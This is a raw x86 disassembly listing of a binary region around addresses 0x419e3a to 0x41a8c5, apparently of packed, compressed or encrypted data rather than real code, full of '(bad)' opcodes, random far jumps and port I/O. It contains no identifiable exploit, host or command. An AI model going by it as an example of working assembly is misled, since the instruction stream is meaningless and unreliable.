  419e3a:	ror    WORD PTR [ecx-0x38],0x4d
  419e3f:	push   eax
  419e40:	jne    0x419e91
  419e42:	push   ebx
  419e43:	call   FWORD PTR [ebx]
  419e45:	inc    ecx
  419e46:	mov    ah,0x51
  419e48:	inc    ebx
  419e49:	fisttp QWORD PTR [ebp-0x6bcbd991]
  419e4f:	into   
  419e50:	cmp    eax,0x25a48d6d
  419e55:	mov    eax,0x290e2ad6
  419e5a:	push   edi
  419e5b:	mov    al,0x88
  419e5d:	push   cs
  419e5e:	repnz or eax,DWORD PTR [esi]
  419e61:	outs   dx,BYTE PTR ds:[esi]
  419e62:	(bad)  
  419e63:	sar    cl,0x2c
  419e66:	stc    
  419e67:	xchg   edi,eax
  419e68:	add    dh,ah
  419e6a:	mov    fs,ecx
  419e6c:	and    eax,0x905a98a
  419e71:	nop
  419e72:	sub    eax,0x9d9079b9
  419e77:	xchg   ebp,eax
  419e78:	inc    esi
  419e79:	js     0x419e8b
  419e7b:	add    dl,0x44
  419e7e:	mov    bl,0x12
  419e80:	adc    bh,bl
  419e82:	out    dx,al
  419e83:	lds    esi,FWORD PTR [edi-0x3c77a89c]
  419e89:	xlat   BYTE PTR ds:[ebx]
  419e8a:	das    
  419e8b:	and    al,0x58
  419e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e8e:	and    al,0xd1
  419e90:	(bad)  
  419e91:	and    esp,edx
  419e93:	sbb    ch,dh
  419e95:	xor    eax,DWORD PTR [esi-0x40cda41d]
  419e9b:	adc    DWORD PTR [edi-0x1bb7b973],0xf1c27a54
  419ea5:	popa   
  419ea6:	push   edi
  419ea7:	popa   
  419ea8:	xchg   ebp,eax
  419ea9:	mov    ecx,0x37c35faf
  419eae:	jae    0x419ef7
  419eb0:	jbe    0x419ee8
  419eb2:	loope  0x419ee7
  419eb4:	inc    edx
  419eb5:	inc    edx
  419eb6:	pop    eax
  419eb7:	sub    edi,DWORD PTR [esp+edi*1+0x7beda20c]
  419ebe:	xchg   edi,eax
  419ebf:	inc    ebp
  419ec0:	retf   
	...
  419f31:	add    BYTE PTR [eax],al
  419f33:	add    BYTE PTR [edi+edx*4],bl
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x2e61f4b7]
  419f41:	sbb    eax,0x193a32ff
  419f46:	add    DWORD PTR [eax],eax
  419f48:	cmc    
  419f49:	add    BYTE PTR [eax],al
  419f4b:	add    ah,bh
  419f4d:	ror    DWORD PTR [bx+si+0x6],0xc0
  419f52:	push   ds
  419f53:	repnz popa 
  419f55:	js     0x419f4d
  419f57:	cli    
  419f58:	jp     0x419f93
  419f5a:	push   cs
  419f5b:	ret    0x4e7c
  419f5e:	or     BYTE PTR [edi+0x4e],0x28
  419f62:	jecxz  0x419fdb
  419f64:	pop    ax
  419f66:	jmp    0x7b784bd5
  419f6b:	push   esi
  419f6c:	rol    BYTE PTR [edx+edi*4],cl
  419f6f:	loope  0x419f25
  419f71:	pop    ebx
  419f72:	cli    
  419f73:	sub    bl,BYTE PTR [ecx]
  419f75:	or     BYTE PTR [edi],bl
  419f77:	and    bh,BYTE PTR [eax+0x54fbe8ed]
  419f7d:	sbb    eax,0x4f3cb292
  419f82:	add    dh,BYTE PTR [edx+0xe]
  419f85:	gs sahf 
  419f87:	dec    edx
  419f88:	outs   dx,DWORD PTR ds:[esi]
  419f89:	out    dx,al
  419f8a:	mov    esp,0xc2ad7670
  419f8f:	sbb    ebp,DWORD PTR [ecx]
  419f91:	out    0x3c,eax
  419f93:	pop    eax
  419f94:	imul   edi,DWORD PTR [ebx],0x20
  419f97:	pop    es
  419f98:	push   0xe08521af
  419f9d:	mov    DWORD PTR [ebp+0x15fbe073],ebp
  419fa3:	add    DWORD PTR [ecx+eax*4+0x1a],0x69
  419fa8:	sub    BYTE PTR [ecx-0x4],dl
  419fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fac:	dec    edx
  419fad:	lock int3 
  419faf:	add    eax,0x33bb3fe8
  419fb4:	pop    ecx
  419fb5:	xchg   BYTE PTR [esi],dl
  419fb7:	mov    cl,0x94
  419fb9:	xchg   ebx,eax
  419fba:	jae    0x41a030
  419fbc:	pop    ds
  419fbd:	pop    esi
  419fbe:	or     edx,DWORD PTR [ecx-0x30]
  419fc1:	or     edx,esi
  419fc3:	fiadd  DWORD PTR [edi]
  419fc5:	fld    QWORD PTR [edi+esi*8+0x29]
  419fc9:	test   BYTE PTR ds:0x8a8d0430,dh
  419fcf:	push   es
  419fd0:	push   cs
  419fd1:	mov    ds:0x1a275ab0,eax
  419fd6:	dec    ebx
  419fd7:	or     cl,dh
  419fd9:	mov    DWORD PTR [esi+0x1cf3a463],ebp
  419fdf:	cmp    dh,BYTE PTR [eax-0xa2f07c3]
  419fe5:	pop    ds
  419fe6:	jl     0x41a012
  419fe8:	pop    ss
  419fe9:	jmp    0x73c38f97
  419fee:	in     al,dx
  419fef:	sbb    BYTE PTR [ebp+eax*8+0x305c8808],ah
  419ff6:	fbld   TBYTE PTR [edi]
  419ff8:	mov    ecx,0x40781cde
  419ffd:	stos   BYTE PTR es:[edi],al
  419ffe:	pushf  
  419fff:	out    0x9b,al
  41a001:	test   BYTE PTR [eax+0x61],dh
  41a004:	retf   
  41a005:	les    ecx,FWORD PTR [ebp-0x69]
  41a008:	xchg   ecx,eax
  41a009:	xchg   edi,eax
  41a00a:	cmp    eax,0x3526e4af
  41a00f:	cmp    BYTE PTR [edx-0x2f],bl
  41a012:	in     eax,dx
  41a013:	nop
  41a014:	fstp   QWORD PTR [ebx]
  41a016:	fnstcw WORD PTR [ebx-0x39173392]
  41a01c:	mov    bh,0x91
  41a01e:	xchg   edi,eax
  41a01f:	add    DWORD PTR [ebp+0x7b3aa614],ebx
  41a025:	in     eax,dx
  41a026:	not    DWORD PTR [esp+ecx*2]
  41a029:	adc    eax,0xcbf26459
  41a02e:	mov    ebp,esp
  41a030:	xor    edi,DWORD PTR [edi-0x2a]
  41a033:	int3   
  41a034:	xor    BYTE PTR [edi],bl
  41a036:	clc    
  41a037:	mov    edx,0xff46e737
  41a03c:	pop    esp
  41a03d:	rcl    DWORD PTR [eax-0x55],0x69
	...
  41a0b1:	add    BYTE PTR [eax],al
  41a0b3:	add    BYTE PTR [edi-0x41bd617b],ch
  41a0b9:	pop    ebx
  41a0ba:	(bad)  
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0xc1d804a2
  41a0c2:	lods   eax,DWORD PTR ds:[esi]
  41a0c3:	iret   
  41a0c4:	das    
  41a0c5:	sbb    al,BYTE PTR [ecx]
  41a0c7:	add    ch,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [esi-0x37ab75f],dh
  41a0d1:	in     al,0x18
  41a0d3:	test   dh,bh
  41a0d5:	call   0x3608:0x4f85f84b
  41a0dc:	in     al,0x28
  41a0de:	ss pop eax
  41a0e0:	xbegin 0x1c35eb74
  41a0e6:	push   0x75f6a4f7
  41a0eb:	cmc    
  41a0ec:	inc    esi
  41a0ed:	sti    
  41a0ee:	mov    bl,0xc5
  41a0f0:	aaa    
  41a0f1:	(bad)  
  41a0f2:	js     0x41a163
  41a0f4:	fwait
  41a0f5:	dec    esp
  41a0f6:	mov    ch,0x8e
  41a0f8:	iret   
  41a0f9:	jno    0x41a161
  41a0fb:	stc    
  41a0fc:	ret    0x81b3
  41a0ff:	dec    ecx
  41a100:	stos   DWORD PTR es:[edi],eax
  41a101:	push   esp
  41a102:	jg     0x41a112
  41a104:	push   ds
  41a105:	sbb    eax,0xa73342df
  41a10a:	sti    
  41a10b:	and    edi,DWORD PTR [eax]
  41a10d:	stc    
  41a10e:	pusha  
  41a10f:	xor    edi,DWORD PTR [ecx+0x6d3e4622]
  41a115:	int    0xcb
  41a117:	pop    ebp
  41a118:	or     eax,DWORD PTR [eax-0x6ec54f3e]
  41a11e:	mov    bl,0x6c
  41a120:	pop    ecx
  41a121:	lods   eax,DWORD PTR ds:[esi]
  41a122:	or     esi,0xffffffed
  41a125:	add    ebp,DWORD PTR [edi]
  41a127:	fs dec ebx
  41a129:	push   ebx
  41a12a:	dec    esi
  41a12b:	jmp    0x2ee52c8
  41a130:	adc    eax,DWORD PTR [edx]
  41a132:	(bad)  
  41a133:	lods   al,BYTE PTR ds:[esi]
  41a134:	mov    gs,esi
  41a136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a137:	(bad)  
  41a138:	push   DWORD PTR [ebx-0xa]
  41a13b:	dec    esi
  41a13c:	mov    al,BYTE PTR [eax-0x1449f3f8]
  41a142:	lods   eax,DWORD PTR ds:[esi]
  41a143:	pop    ebp
  41a144:	(bad)  
  41a145:	lea    eax,[ecx-0x1e]
  41a148:	mov    esi,0x9668a75f
  41a14d:	pop    ds
  41a14e:	adc    DWORD PTR [esi],esi
  41a150:	mov    esp,0xe5cebc27
  41a155:	adc    eax,DWORD PTR [esi-0x6]
  41a158:	mov    ebx,0xaf416616
  41a15d:	mov    dh,cl
  41a15f:	ins    BYTE PTR es:[edi],dx
  41a160:	inc    ebp
  41a161:	mov    bh,BYTE PTR [ecx+0x418d2005]
  41a167:	data16 outs dx,BYTE PTR ds:[esi]
  41a169:	aad    0x24
  41a16b:	scas   al,BYTE PTR es:[edi]
  41a16c:	arpl   WORD PTR [edx],bx
  41a16e:	fild   DWORD PTR [eax]
  41a170:	fimul  DWORD PTR [edi-0x62]
  41a173:	nop
  41a174:	je     0x41a167
  41a176:	jg     0x41a168
  41a178:	inc    eax
  41a179:	xor    al,0x17
  41a17b:	stc    
  41a17c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a17d:	sub    edi,esp
  41a17f:	leave  
  41a180:	xchg   BYTE PTR [esi+eiz*1],ah
  41a183:	dec    ebp
  41a184:	cmp    BYTE PTR [edx+0x42],bl
  41a187:	test   eax,0x8cbf8878
  41a18c:	into   
  41a18d:	in     eax,0x73
  41a18f:	sub    al,0x7a
  41a191:	sub    eax,DWORD PTR [ebx-0x56]
  41a194:	test   al,0x56
  41a196:	lahf   
  41a197:	mov    esi,0x9893a830
  41a19c:	lds    esp,FWORD PTR [ebp+0xf]
  41a19f:	stc    
  41a1a0:	sbb    BYTE PTR [ebx-0xe],cl
  41a1a3:	out    0xd1,al
  41a1a5:	mov    al,ds:0xd752cffd
  41a1aa:	mov    al,0xe8
  41a1ac:	iret   
  41a1ad:	jle    0x41a1e8
  41a1af:	mov    BYTE PTR [eax+0xfcd184e],dh
  41a1b5:	and    DWORD PTR ds:0xb07fb103,ebp
  41a1bb:	mov    edi,DWORD PTR [ebp-0x64]
  41a1be:	pop    es
  41a1bf:	pop    edi
  41a1c0:	retf   
	...
  41a231:	add    BYTE PTR [eax],al
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	test   BYTE PTR [ebp-0x53],0xf3
  41a243:	hlt    
  41a244:	and    al,0x1b
  41a246:	add    DWORD PTR [eax],eax
  41a248:	cmc    
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR [ecx-0x7b3dc1cf],bl
  41a251:	das    
  41a252:	pop    esp
  41a253:	mov    dl,0xaf
  41a255:	fnstcw WORD PTR [edx]
  41a257:	or     al,0x44
  41a259:	jle    0x41a25a
  41a25b:	out    0x22,al
  41a25d:	cwde   
  41a25e:	push   es
  41a25f:	faddp  st(1),st
  41a261:	jmp    DWORD PTR [eax]
  41a263:	cmp    edi,DWORD PTR [eax-0x41]
  41a266:	arpl   dx,bp
  41a268:	push   cs
  41a269:	jns    0x41a2d0
  41a26b:	pop    edi
  41a26c:	lock cmp BYTE PTR [eax+eiz*4],bh
  41a270:	jmp    0x8fadad4
  41a275:	retf   0x53c2
  41a278:	cmp    al,0xe1
  41a27a:	push   ebx
  41a27b:	fucomip st,st(6)
  41a27d:	jmp    0x41a2b2
  41a27f:	mov    ah,0xc1
  41a281:	sar    DWORD PTR [esi+0x564e830a],0xd1
  41a288:	ds dec edi
  41a28a:	mov    ecx,0xbefaa4cd
  41a28f:	cdq    
  41a290:	in     eax,0x38
  41a292:	xor    al,0xce
  41a294:	push   edi
  41a295:	cld    
  41a296:	xor    cl,BYTE PTR [ebp+0x3cfb3361]
  41a29c:	mov    dl,0xe
  41a29e:	jnp    0x41a24e
  41a2a0:	in     eax,0x65
  41a2a2:	imul   ecx,DWORD PTR [edi-0x1d],0x50840bf0
  41a2a9:	rcl    BYTE PTR [ecx+0x7f],1
  41a2ac:	mov    al,0x7a
  41a2ae:	push   0xac166e6a
  41a2b3:	or     al,BYTE PTR [eax+ebx*1-0x47]
  41a2b7:	shr    BYTE PTR [eax-0x12],cl
  41a2ba:	cdq    
  41a2bb:	cwde   
  41a2bc:	adc    DWORD PTR [edi+0x1f9f42f1],ebp
  41a2c2:	push   0x6d
  41a2c4:	and    al,0x55
  41a2c6:	test   BYTE PTR fs:[eax-0x65d83e8b],al
  41a2cd:	cld    
  41a2ce:	adc    eax,DWORD PTR [esi+0x7987bf2f]
  41a2d4:	jns    0x41a268
  41a2d6:	or     BYTE PTR [edi-0x73e48b3e],0x6d
  41a2dd:	adc    edi,DWORD PTR [edx+0x4b]
  41a2e0:	ficomp WORD PTR [eax-0x4673e8cd]
  41a2e6:	cmp    al,0x75
  41a2e8:	fistp  DWORD PTR [edi-0x630169be]
  41a2ee:	jmp    0x41a32e
  41a2f0:	cmp    BYTE PTR [edi+0x40],bh
  41a2f3:	(bad)  
  41a2f4:	adc    ebp,DWORD PTR [eax-0x47]
  41a2f7:	jmp    0x41a28c
  41a2f9:	mov    ebp,0xba625716
  41a2fe:	aaa    
  41a2ff:	js     0x41a2da
  41a301:	mov    eax,ds:0x3dda6c95
  41a306:	ins    BYTE PTR es:[edi],dx
  41a307:	xor    al,0x7f
  41a309:	pop    edx
  41a30a:	cmp    al,0x7d
  41a30c:	push   edx
  41a30d:	push   edx
  41a30e:	and    edx,esi
  41a310:	jne    0x41a2e7
  41a312:	pop    ds
  41a313:	push   esi
  41a314:	popf   
  41a315:	ins    DWORD PTR es:[edi],dx
  41a316:	jp     0x41a2f8
  41a318:	pop    edi
  41a319:	dec    eax
  41a31a:	mov    ebp,0x6d69b8fd
  41a31f:	in     eax,0xf4
  41a321:	dec    ecx
  41a322:	test   esp,ecx
  41a324:	add    al,0xf4
  41a326:	push   DWORD PTR [ecx+0x79f3ff0f]
  41a32c:	cmc    
  41a32d:	lods   eax,DWORD PTR ds:[esi]
  41a32e:	adc    al,0x9e
  41a330:	popf   
  41a331:	push   0x267e5f36
  41a336:	xor    eax,0x7db2935d
  41a33b:	sbb    edx,esp
  41a33d:	mov    ebx,0xe56322
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	es out 0x1,eax
  41a3c3:	das    
  41a3c4:	sbb    DWORD PTR [ecx+eax*1],ebx
  41a3c7:	add    ch,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [edx+0x52180d97],bl
  41a3d1:	push   edx
  41a3d2:	xchg   ebp,eax
  41a3d3:	daa    
  41a3d4:	icebp  
  41a3d5:	mov    cl,0xfa
  41a3d7:	push   ss
  41a3d8:	mov    ds:0x9a0b1829,al
  41a3dd:	mov    bl,0xb0
  41a3df:	cmp    eax,0xc6e8fc32
  41a3e4:	inc    esp
  41a3e5:	and    eax,0xdad6cc6a
  41a3ea:	adc    ch,BYTE PTR [eax]
  41a3ec:	lock gs jmp 0x211cc68c
  41a3f3:	clc    
  41a3f4:	cwde   
  41a3f5:	push   ecx
  41a3f6:	cmp    eax,0x616447b4
  41a3fb:	or     ebp,DWORD PTR [ebp-0x5e50e977]
  41a401:	xor    al,0x1
  41a403:	rol    BYTE PTR [ebp+esi*1-0x75],cl
  41a407:	sub    BYTE PTR [bp+di],cl
  41a40a:	xor    al,0xf3
  41a40c:	push   cs
  41a40d:	fcmove st,st(5)
  41a40f:	sub    al,0xe1
  41a411:	mov    ah,0xb8
  41a413:	arpl   WORD PTR [ebp-0x2c],ax
  41a416:	adc    eax,DWORD PTR [esi+0x3f]
  41a419:	xor    BYTE PTR [edx-0x7a46d437],cl
  41a41f:	dec    edx
  41a420:	int    0x8e
  41a422:	loopne 0x41a404
  41a424:	dec    edx
  41a425:	inc    ebp
  41a426:	xchg   ecx,eax
  41a427:	enter  0xf097,0xc
  41a42b:	(bad)  
  41a42c:	pop    eax
  41a42d:	or     al,0xd2
  41a42f:	test   eax,0x49ad4c41
  41a434:	test   edx,edx
  41a436:	ins    DWORD PTR es:[edi],dx
  41a437:	or     eax,DWORD PTR [esi+ebp*2-0xf]
  41a43b:	push   edi
  41a43c:	sub    DWORD PTR [eax],0xfbbe6c53
  41a442:	int    0xd8
  41a444:	sub    esi,esi
  41a446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a447:	dec    esp
  41a448:	mov    ds:0xe6eddc8f,eax
  41a44d:	xor    al,0x50
  41a44f:	lds    esp,FWORD PTR [eax]
  41a451:	and    al,0x1d
  41a453:	mov    edx,0x8cbf0fa2
  41a458:	sahf   
  41a459:	outs   dx,BYTE PTR ds:[esi]
  41a45a:	(bad)  
  41a45b:	call   0xd88aa69
  41a460:	pop    esi
  41a461:	adc    eax,0x1893e014
  41a466:	icebp  
  41a467:	call   0x99fd2ac2
  41a46c:	pop    edi
  41a46d:	and    cl,ch
  41a46f:	inc    ecx
  41a470:	fistp  QWORD PTR [edx-0x7]
  41a473:	popa   
  41a474:	pusha  
  41a475:	mov    bh,0x89
  41a477:	cwde   
  41a478:	dec    ebx
  41a479:	pop    ss
  41a47a:	aad    0x3d
  41a47c:	fs mov ebp,0x7130c73f
  41a482:	nop
  41a483:	call   0x7cd25d3f
  41a488:	push   ecx
  41a489:	push   0xffffffe0
  41a48b:	and    cl,0x7c
  41a48e:	nop
  41a48f:	dec    ecx
  41a490:	xchg   DWORD PTR [edx],edx
  41a492:	add    DWORD PTR [ebp-0x482598b1],edx
  41a498:	sub    ch,bl
  41a49a:	test   DWORD PTR [ebx-0x6e86610c],ecx
  41a4a0:	or     BYTE PTR [ebx-0x50],0xe2
  41a4a4:	cdq    
  41a4a5:	pop    ss
  41a4a6:	repnz or ah,BYTE PTR [edx+ecx*4-0x2]
  41a4ab:	push   0xf3006a80
  41a4b0:	call   0x8d096093
  41a4b5:	aas    
  41a4b6:	clc    
  41a4b7:	push   0xffffffbb
  41a4b9:	inc    DWORD PTR [eax-0x2a]
  41a4bc:	push   ebp
  41a4bd:	jbe    0x41a47e
  41a4bf:	xchg   edi,ebx
	...
  41a531:	add    BYTE PTR [eax],al
  41a533:	add    BYTE PTR [edi-0x9d722c],ch
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax+0x79e9e0aa]
  41a541:	xchg   esp,eax
  41a542:	inc    edx
  41a543:	fs push cs
  41a545:	sbb    eax,0xf50001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	cld    
  41a54d:	mov    al,0x7e
  41a54f:	ret    0xdf7e
  41a552:	sub    eax,0x6d7c37a6
  41a557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a558:	sbb    eax,DWORD PTR [ecx+0x70d80805]
  41a55e:	mov    ebp,0x86e5256f
  41a563:	lsl    esp,WORD PTR [esi-0x2a]
  41a567:	into   
  41a568:	add    al,bh
  41a56a:	inc    edx
  41a56b:	xor    ecx,ecx
  41a56d:	mov    edx,0x586bd814
  41a572:	sbb    eax,DWORD PTR [ebx+edi*4-0x2f5d2059]
  41a579:	jg     0x41a583
  41a57b:	push   0x45
  41a57d:	inc    ebp
  41a57e:	pop    edi
  41a57f:	pop    ds
  41a580:	add    esi,DWORD PTR ds:0xd113b71a
  41a586:	popf   
  41a587:	mov    ecx,0xb3f6ae19
  41a58c:	stc    
  41a58d:	lods   al,BYTE PTR ds:[esi]
  41a58e:	or     DWORD PTR [ecx-0x35465c46],edx
  41a594:	xchg   ebp,eax
  41a595:	shl    BYTE PTR [ecx-0x5856cdeb],1
  41a59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a59c:	sub    ch,ch
  41a59e:	mov    ah,BYTE PTR [edi+0x3be8b5c8]
  41a5a4:	vpmuludq xmm4,xmm6,xmm3
  41a5a8:	mov    edx,0x5bd938a0
  41a5ad:	mov    bl,0x7c
  41a5af:	fstp   TBYTE PTR ds:0x5184eb87
  41a5b5:	xor    BYTE PTR [ebx],cl
  41a5b7:	dec    esi
  41a5b8:	(bad)  
  41a5b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ba:	pop    esi
  41a5bb:	(bad)  
  41a5bc:	dec    esi
  41a5bd:	xor    DWORD PTR [esi+edi*2],ebp
  41a5c0:	xchg   esp,eax
  41a5c1:	dec    esp
  41a5c2:	(bad)  
  41a5c3:	cmp    esp,DWORD PTR [ecx]
  41a5c5:	and    al,0x7f
  41a5c7:	jle    0x41a5c0
  41a5c9:	mov    ecx,eax
  41a5cb:	retf   0x1c25
  41a5ce:	or     ecx,DWORD PTR [eax+eiz*2]
  41a5d1:	sbb    DWORD PTR [ebp+0x444f183a],esp
  41a5d7:	(bad)  
  41a5d8:	ror    ebp,1
  41a5da:	mov    al,ds:0xf5964e32
  41a5df:	push   cs
  41a5e0:	arpl   WORD PTR ds:0xcc1420a2,si
  41a5e6:	arpl   WORD PTR [esi],bp
  41a5e8:	and    ch,BYTE PTR [esi+eiz*8]
  41a5eb:	popf   
  41a5ec:	fsub   QWORD PTR [eax+ecx*1]
  41a5ef:	nop
  41a5f0:	cmp    eax,DWORD PTR [ebp+0x35]
  41a5f3:	mov    ebp,0xafa75e77
  41a5f8:	lds    ecx,FWORD PTR [esi]
  41a5fa:	and    al,0x52
  41a5fc:	sbb    BYTE PTR [eax],ch
  41a5fe:	fsub   DWORD PTR [ebx+0x1c2dd8fd]
  41a604:	xlat   BYTE PTR ds:[ebx]
  41a605:	pop    es
  41a606:	adc    DWORD PTR [ebp+0x1a],ecx
  41a609:	sbb    eax,0xc5aa9115
  41a60e:	mov    ecx,0xda52407e
  41a613:	pop    DWORD PTR [ecx+0x230ff870]
  41a619:	(bad)  
  41a61a:	mov    edx,0x26e74213
  41a61f:	sahf   
  41a620:	pop    ecx
  41a621:	mov    bl,0x3f
  41a623:	push   0xffffffc1
  41a625:	cmp    DWORD PTR [esi+0x76e842ad],0xb6ba3cca
  41a62f:	cmp    BYTE PTR [edi],ch
  41a631:	xchg   edi,eax
  41a632:	mov    ebp,0x2350f3b2
  41a637:	sub    DWORD PTR [edi-0x5e05edc9],0xd1b4880c
	...
  41a6b1:	add    BYTE PTR [eax],al
  41a6b3:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0x25
  41a6c1:	(bad)  
  41a6c2:	test   esi,eax
  41a6c4:	add    ebx,DWORD PTR [esi]
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	cmc    
  41a6c9:	add    BYTE PTR [eax],al
  41a6cb:	add    dl,ah
  41a6cd:	add    BYTE PTR [ebx+eiz*1+0x4ac1b1b7],0xb0
  41a6d5:	jb     0x41a6ec
  41a6d7:	ret    0x110e
  41a6da:	mov    ch,al
  41a6dc:	mov    al,ds:0x7c677010
  41a6e1:	shl    BYTE PTR [edx+0x4c],0xb4
  41a6e5:	add    BYTE PTR ds:0x9ce24e8c,dl
  41a6eb:	scas   eax,DWORD PTR es:[edi]
  41a6ec:	cld    
  41a6ed:	xchg   ebx,eax
  41a6ee:	in     al,dx
  41a6ef:	fld    DWORD PTR [eax+0x55]
  41a6f2:	push   edx
  41a6f3:	xchg   ecx,eax
  41a6f4:	xor    BYTE PTR [edx-0x575c5b13],0x9c
  41a6fb:	repz imul esp,DWORD PTR [ebx+0x4b0035d7],0x22
  41a703:	xor    eax,0xc2b8aedf
  41a708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a709:	mov    al,0x7
  41a70b:	ss push ebp
  41a70d:	jbe    0x41a697
  41a70f:	cwde   
  41a710:	out    0x79,eax
  41a712:	(bad)  
  41a713:	jbe    0x41a6eb
  41a715:	and    BYTE PTR [esp+ebx*8],ch
  41a718:	popa   
  41a719:	xchg   edi,eax
  41a71a:	pop    esi
  41a71b:	scas   eax,DWORD PTR es:[edi]
  41a71c:	inc    ebp
  41a71d:	push   edi
  41a71e:	fst    QWORD PTR [ebx]
  41a720:	shl    BYTE PTR [ebx+0x4f1dfcbd],0x5d
  41a727:	inc    ebx
  41a728:	outs   dx,DWORD PTR ds:[esi]
  41a729:	mov    cl,0xda
  41a72b:	jns    0x41a797
  41a72d:	fprem1 
  41a72f:	mov    edx,ebp
  41a731:	ficom  DWORD PTR [esi-0x45]
  41a734:	ds cdq 
  41a736:	push   ds
  41a737:	lods   eax,DWORD PTR ds:[esi]
  41a738:	dec    esi
  41a739:	inc    esp
  41a73a:	retf   
  41a73b:	lods   al,BYTE PTR ds:[esi]
  41a73c:	rcr    DWORD PTR ds:0x96db31a0,cl
  41a742:	jecxz  0x41a756
  41a744:	out    0x38,al
  41a746:	shr    BYTE PTR [edx],1
  41a748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a749:	jp     0x41a70c
  41a74b:	clc    
  41a74c:	ds js  0x41a769
  41a74f:	push   cs
  41a750:	xchg   al,cl
  41a752:	fiadd  WORD PTR [ebp+edx*4+0x20885eb]
  41a759:	js     0x41a78e
  41a75b:	mov    eax,0x71f65d5f
  41a760:	xlat   BYTE PTR ds:[ebx]
  41a761:	dec    ecx
  41a762:	inc    ecx
  41a763:	dec    edx
  41a764:	mov    ds:0x366fbf49,al
  41a769:	or     al,0x9b
  41a76b:	int3   
  41a76c:	push   0xa0af5dfc
  41a771:	ss nop
  41a773:	in     al,0x43
  41a775:	jle    0x41a78d
  41a777:	stos   DWORD PTR es:[edi],eax
  41a778:	jecxz  0x41a7b2
  41a77a:	add    dl,BYTE PTR [edi+0x4f2ea4a5]
  41a780:	mov    ch,0x46
  41a782:	fld    QWORD PTR [ecx]
  41a784:	add    BYTE PTR [ebp+0x108759a1],ah
  41a78a:	jns    0x41a7b1
  41a78c:	lds    esi,FWORD PTR [edx-0x22108800]
  41a792:	xchg   ebp,eax
  41a793:	jne    0x41a790
  41a795:	xchg   edx,eax
  41a796:	(bad)  
  41a797:	iret   
  41a798:	mov    bh,0x4f
  41a79a:	in     eax,dx
  41a79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a79c:	loop   0x41a745
  41a79e:	mov    eax,0xa233e1da
  41a7a3:	clc    
  41a7a4:	ret    0xbbc0
  41a7a7:	sub    eax,0xd0889220
  41a7ac:	xchg   BYTE PTR [edi],dl
  41a7ae:	mov    edi,DWORD PTR [ebx+0x11]
  41a7b1:	add    edi,DWORD PTR [ebx+0x2]
  41a7b4:	out    dx,al
  41a7b5:	mov    DWORD PTR [ecx+0x27b90de3],edx
  41a7bb:	pop    ds
  41a7bc:	jp     0x41a778
  41a7be:	cdq    
  41a7bf:	stos   DWORD PTR es:[edi],eax
  41a7c0:	inc    BYTE PTR [eax]
	...
  41a832:	add    BYTE PTR [eax],al
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a8a2
  41a841:	fild   DWORD PTR [esi+0x11ef8c0]
  41a847:	add    ch,dh
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [ebp-0x21cdf8ed],al
  41a851:	neg    dh
  41a853:	fimul  DWORD PTR [esi-0x2c]
  41a856:	pop    ss
  41a857:	xor    eax,0xd2ae1fa2
  41a85c:	fincstp 
  41a85e:	sub    DWORD PTR [ecx+edx*4-0x271365d0],eax
  41a865:	sub    BYTE PTR [ecx],ch
  41a867:	ficomp DWORD PTR [ecx]
  41a869:	jne    0x41a81a
  41a86b:	shr    BYTE PTR [ebp-0x36a02551],cl
  41a871:	xchg   ebx,eax
  41a872:	arpl   bp,di
  41a874:	enter  0xed79,0xa7
  41a878:	fild   WORD PTR [ebx-0x2a]
  41a87b:	in     al,dx
  41a87c:	icebp  
  41a87d:	sahf   
  41a87e:	ret    
  41a87f:	das    
  41a880:	push   esi
  41a881:	dec    esp
  41a882:	jg     0x41a8c5
  41a884:	fmul   st,st(5)
  41a886:	mov    eax,0xf7135d3a
  41a88b:	mov    al,fs:0x98802877
  41a891:	add    eax,0xd87eb98a
  41a896:	jmp    0xe4b3:0x811fb455
  41a89d:	outs   dx,DWORD PTR ds:[esi]
  41a89e:	xor    DWORD PTR [ecx-0x74],eax
  41a8a1:	sub    eax,0x5410be02
  41a8a6:	xor    ebp,DWORD PTR [ecx+ecx*1+0x19]
  41a8aa:	add    al,0xac
  41a8ac:	mov    al,0x4e
  41a8ae:	jae    0x41a874
  41a8b0:	hlt    
  41a8b1:	test   BYTE PTR [ebx-0x58],ah
  41a8b4:	cli    
  41a8b5:	js     0x41a8ed
  41a8b7:	(bad)  
  41a8b9:	push   0xb51953b1
  41a8be:	xor    eax,0xa4bf232a
  41a8c3:	jo     0x41a889
  41a8c5:	sub    ah,al
